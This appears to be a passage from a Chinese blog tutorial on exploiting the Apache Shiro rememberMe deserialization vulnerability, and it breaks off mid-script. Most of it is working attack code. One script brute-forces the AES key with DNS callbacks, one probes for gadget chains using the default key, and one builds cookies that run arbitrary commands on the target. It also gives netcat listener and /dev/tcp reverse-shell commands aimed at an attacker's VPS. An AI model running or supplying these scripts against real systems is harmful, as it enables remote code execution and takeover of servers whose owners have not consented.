+<h4 id="如何确认漏洞存在并确认key值"><a href="#如何确认漏洞存在并确认key值" class="headerlink" title="如何确认漏洞存在并确认key值"></a>如何确认漏洞存在并确认key值</h4><p>shiro的攻击原理是通过固定的AES密钥来进行payload的构造，所以需要进行AES密钥的测试<br><code>python shiroKeyTest.py -u http://localhost:9000/</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shiroKeyTest.py</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">executor = ThreadPoolExecutor(max_workers=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">jre_path = <span class="string">"./ysoserial.jar"</span></span><br><span class="line">char_set = <span class="string">"qwertyuiopasdfghjklzxcvbnm0123456789"</span></span><br><span class="line">dns_domain = <span class="string">"dns.shiro.com"</span></span><br><span class="line">shiro_key_path = <span class="string">'./key.txt'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(domain,shiro_key)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, jre_path, <span class="string">'URLDNS'</span>, domain], stdout=subprocess.PIPE)</span><br><span class="line">        BS = AES.block_size</span><br><span class="line">        pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">        key = base64.b64decode(shiro_key)</span><br><span class="line">        iv = uuid.uuid4().bytes</span><br><span class="line">        encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">        file_body = pad(popen.stdout.read())</span><br><span class="line">        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">        <span class="keyword">return</span> base64_ciphertext.decode()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(str(e)+<span class="string">" with key:"</span>+shiro_key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_Shiro_Poc</span><span class="params">(url,cookie)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        re = requests.get(url=url,cookies=&#123;<span class="string">'rememberMe'</span>: cookie&#125;,allow_redirects=<span class="literal">False</span> ,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(str(e))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_shiro_test</span><span class="params">(target)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> target.startswith(<span class="string">'http://'</span>) <span class="keyword">or</span> target.startswith(<span class="string">'https://'</span>):</span><br><span class="line">        print(<span class="string">"URL format is http://127.0.0.1:8080/login"</span>)</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    threads = []</span><br><span class="line">    random_domain = <span class="string">""</span>.join(random.sample(char_set,<span class="number">5</span>))</span><br><span class="line">    print(<span class="string">"Start Poc for %s"</span>%target)</span><br><span class="line">    print(<span class="string">"Random Domain is : [%s.%s]"</span>%(random_domain,dns_domain))</span><br><span class="line">    key_file = open(shiro_key_path,<span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> key_file.readlines():</span><br><span class="line">        key = key.strip()</span><br><span class="line">        <span class="keyword">if</span> key != <span class="string">""</span>:</span><br><span class="line">            test_domain=<span class="string">""</span></span><br><span class="line">            count=<span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">                <span class="keyword">if</span> count==<span class="number">5</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> i.lower() <span class="keyword">in</span> char_set:</span><br><span class="line">                    test_domain = test_domain+i</span><br><span class="line">                    count+=<span class="number">1</span></span><br><span class="line">            full_domain = <span class="string">"http://%s.%s.%s"</span>%(test_domain,random_domain,dns_domain)</span><br><span class="line">            shiro_cookie = encode_rememberme(full_domain,key)</span><br><span class="line">            task = executor.submit(send_Shiro_Poc,target,shiro_cookie)</span><br><span class="line">            threads.append(task)</span><br><span class="line">    <span class="comment"># for task in threads:</span></span><br><span class="line">    <span class="comment">#     task.join()</span></span><br><span class="line">    print(<span class="string">"All Poc Send Finished,Please Check DNS Result."</span>)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,</span><br><span class="line">                                    description=<span class="string">'Apache Shiro Test By She1don'</span>,</span><br><span class="line">                                    usage=<span class="string">'python2/3 shiro.py -u http://127.0.0.1:8080/login'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--input'</span>,<span class="string">'-i'</span>,default=<span class="string">"url.txt"</span>,type=str,help=<span class="string">'Input target file path'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--url'</span>,<span class="string">'-u'</span>,type=str,help=<span class="string">'Input Target url,Example:http://127.0.0.1:8080/login'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)==<span class="number">1</span>:</span><br><span class="line">        sys.argv.append(<span class="string">'-h'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.url != <span class="literal">None</span>:</span><br><span class="line">        start_shiro_test(args.url)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"从文件输入未完成."</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload = encode_rememberme(sys.argv[1])    </span></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br></pre></td></tr></table></figure>
+
+
+<p>然后查看vps的dnslog，shiroKeyTest.py会发起请求，携带key发起请求。<br>服务器会接收到如下的请求<br><code>shiroKey.dns.shiro.com</code><br>这样就可以确定shiro漏洞的存在以及key值</p>
+<h2 id="0x04-如何利用"><a href="#0x04-如何利用" class="headerlink" title="0x04 如何利用"></a>0x04 如何利用</h2><h3 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h3><p>运行dnslog.py，接着运行shiroCCTest.py，将上一步获得的key值填入后执行脚本。在dns解析记录中获取利用链</p>
+<p><code>python3 shiroCCTest.py -u http://[靶机地址]</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">executor = ThreadPoolExecutor(max_workers=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">jre_path = <span class="string">"./ysoserial.jar"</span></span><br><span class="line">char_set = <span class="string">"qwertyuiopasdfghjklzxcvbnm0123456789"</span></span><br><span class="line">dns_domain = <span class="string">"dns.shiro.com"</span>	   <span class="comment">#设置dns服务器地址</span></span><br><span class="line">key = <span class="string">'kPH+bIxk5D2deZiIxcaaaA=='</span><span class="comment">#设置key</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(domain, i)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cc = <span class="string">'CommonsCollections'</span>+i</span><br><span class="line">        <span class="comment">#print(cc)</span></span><br><span class="line">        payload = <span class="string">"ping "</span> + domain</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        popen = subprocess.Popen(</span><br><span class="line">            [<span class="string">'java'</span>, <span class="string">'-jar'</span>, jre_path, cc, payload], stdout=subprocess.PIPE)</span><br><span class="line">        BS = AES.block_size</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(s)</span>:</span> </span><br><span class="line">            <span class="keyword">return</span> s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">        shiroKey = base64.b64decode(key)</span><br><span class="line">        iv = uuid.uuid4().bytes</span><br><span class="line">        encryptor = AES.new(shiroKey, AES.MODE_CBC, iv)</span><br><span class="line">        file_body = pad(popen.stdout.read())</span><br><span class="line">        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">        <span class="keyword">return</span> base64_ciphertext.decode()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="comment">#print(str(e)+" with key:"+shiroKey)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_Shiro_Poc</span><span class="params">(url, cookie)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#   print(cookie)</span></span><br><span class="line">        re = requests.get(url=url, cookies=&#123;</span><br><span class="line">                          <span class="string">'rememberMe'</span>: cookie&#125;, allow_redirects=<span class="literal">False</span>, timeout=<span class="number">10</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(str(e))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_shiro_test</span><span class="params">(target)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> target.startswith(<span class="string">'http://'</span>) <span class="keyword">or</span> target.startswith(<span class="string">'https://'</span>):</span><br><span class="line">        print(<span class="string">"URL format is http://127.0.0.1:8080/login"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    threads = []</span><br><span class="line">    random_domain = <span class="string">""</span>.join(random.sample(char_set, <span class="number">5</span>))</span><br><span class="line">    print(<span class="string">"Start Poc for %s"</span> % target)</span><br><span class="line">    print(<span class="string">"Random Domain is : [%s.%s]"</span> % (random_domain, dns_domain))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        test_domain = str(i+<span class="number">1</span>)</span><br><span class="line">        full_domain = <span class="string">"http://%s.%s.%s"</span> % (test_domain,</span><br><span class="line">                                           random_domain, dns_domain)</span><br><span class="line">        <span class="comment">#print(full_domain)</span></span><br><span class="line">        shiro_cookie = encode_rememberme(full_domain, str(i+<span class="number">1</span>))</span><br><span class="line">        task = executor.submit(send_Shiro_Poc, target, shiro_cookie)</span><br><span class="line">        threads.append(task)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"All Poc Send Finished,Please Check DNS Result."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,</span><br><span class="line">                                     description=<span class="string">'1.Apache Shiro Test By She1don \n2.Edit by White'</span>,</span><br><span class="line">                                     usage=<span class="string">'python2/3 shiro.py -u http://127.0.0.1:8080/login'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--input'</span>, <span class="string">'-i'</span>, default=<span class="string">"url.txt"</span>,</span><br><span class="line">                        type=str, help=<span class="string">'Input target file path'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--url'</span>, <span class="string">'-u'</span>, type=str,</span><br><span class="line">                        help=<span class="string">'Input Target url,Example:http://127.0.0.1:8080/login'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        sys.argv.append(<span class="string">'-h'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.url != <span class="literal">None</span>:</span><br><span class="line">        start_shiro_test(args.url)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"从文件输入未完成."</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>vps监听端口<br><code>nc -lvv -p 1111</code></p>
+<p>然后执行：<br><code>python3 shiroRce.py &quot;echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/你的vps的公网ip/1111 0&gt;&amp;1&#39; &gt;&gt; a.txt &amp;&amp;bash a.txt&quot;</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">auth: @acgbfull</span></span><br><span class="line"><span class="string">version: 1.0</span></span><br><span class="line"><span class="string">function: Apache Shiro &lt;= 1.2.4 Deserialization RCE via Cookie rememberMe</span></span><br><span class="line"><span class="string">usage: python shiro.py ip:port</span></span><br><span class="line"><span class="string">       python shiro.py command</span></span><br><span class="line"><span class="string">       python shiro.py -u url -o file_path ip:port|command</span></span><br><span class="line"><span class="string">note:</span></span><br><span class="line"><span class="string">Step1: Generate Cookie rememberMe</span></span><br><span class="line"><span class="string">Step2: Send Cookie to target</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> RawTextHelpFormatter</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(data, module)</span>:</span></span><br><span class="line">    <span class="comment"># module is JRMPClient or CommonsCollections2</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, module, data], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_cookie_rememberme</span><span class="params">(file_path, data)</span>:</span></span><br><span class="line">    file_path = file_path</span><br><span class="line">    sys_argv_red = data</span><br><span class="line">    ip_port_pattern = re.compile(<span class="string">r'^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;:\d&#123;2,5&#125;$'</span>)</span><br><span class="line">    switch_result = ip_port_pattern.search(sys_argv_red)</span><br><span class="line">    <span class="keyword">if</span> switch_result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> switch_result <span class="keyword">is</span> <span class="keyword">not</span> <span class="string">""</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload_rebound = encode_rememberme(sys_argv_red, <span class="string">'JRMPClient'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> error:</span><br><span class="line">            print(<span class="string">"Generate cookie Error: &#123;0&#125;: &#123;1&#125;"</span>.format(Exception, error))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        cookie = <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload_rebound.decode())</span><br><span class="line">        print(<span class="string">"Generate cookie success\n"</span>)</span><br><span class="line">        <span class="keyword">if</span> file_contents_operate(file_path, method=<span class="string">'w'</span>, contents=cookie):</span><br><span class="line">            print(<span class="string">"&#123;0&#125;"</span>.format(cookie))</span><br><span class="line">            print(<span class="string">"\ncookie value in payload.cookie.txt\n"</span>)</span><br><span class="line">            <span class="keyword">return</span> cookie</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"!!!Cookie rememberMe write file error\n"</span>)</span><br><span class="line">            print(<span class="string">"&#123;0&#125;"</span>.format(cookie))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        string = str(base64.b64encode(sys_argv_red.encode(encoding=<span class="string">"utf-8"</span>)), encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">        bash_java_base64_encode_str = <span class="string">"bash -c &#123;&#123;echo,&#123;0&#125;&#125;&#125;|&#123;&#123;base64,-d&#125;&#125;|&#123;&#123;bash,-i&#125;&#125;"</span>.format(string)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload_command = encode_rememberme(bash_java_base64_encode_str, <span class="string">'CommonsCollections2'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> error:</span><br><span class="line">            print(<span class="string">"Generate cookie Error: &#123;0&#125;: &#123;1&#125;"</span>.format(Exception, error))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        cookie = <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload_command.decode())</span><br><span class="line">        print(<span class="string">"Generate cookie success\n"</span>)</span><br><span class="line">        <span class="keyword">if</span> file_contents_operate(file_path, method=<span class="string">'w'</span>, contents=cookie):</span><br><span class="line">            print(<span class="string">"&#123;0&#125;"</span>.format(cookie))</span><br><span class="line">            print(<span class="string">"\ncookie value in payload.cookie.txt\n"</span>)</span><br><span class="line">            <span class="keyword">return</span> cookie</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"!!!Cookie rememberMe write file error\n"</span>)</span><br><span class="line">            print(<span class="string">"&#123;0&#125;"</span>.format(cookie))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_contents_operate</span><span class="params">(file_path, method=<span class="string">'r'</span>, contents=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> file_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">if</span> method == <span class="string">'r'</span>:</span><br><span class="line">            <span class="keyword">with</span> open(file_path, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">return</span> f.read()</span><br><span class="line">        <span class="keyword">if</span> method == <span class="string">'w'</span>:</span><br><span class="line">            <span class="keyword">with</span> open(file_path, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(contents)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> method == <span class="string">'a'</span>:</span><br><span class="line">            <span class="keyword">with</span> open(file_path, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(contents)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">u"ERROR: 